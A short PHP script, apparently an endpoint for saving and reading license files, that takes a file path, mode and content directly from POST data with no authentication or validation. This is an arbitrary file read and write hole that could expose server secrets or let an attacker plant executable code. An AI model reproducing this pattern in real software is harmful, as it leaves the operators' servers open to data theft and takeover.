<?php

$posted = &$_POST ;

$fname=$posted["license"];

$mode = $posted["mode"];


if($mode == "w")
{

	$value = $posted["content"];

	$nfile = fopen($fname, $mode);

	if($nfile != false)
		{
			fwrite($nfile, $value);
			fclose($nfile);
		}	
}	



if( $mode == "r")
{
	try {
	    $content = @file_get_contents($fname);  // remove warning message when file not exist
			
	    if ($content == false) {
	    // Handle exception
	        echo 404;
	    }
	    echo $content;
	} catch (Exception $e) {
	    // Handle exception
	        echo "exception e:", $e;
	}

}	


?>
		
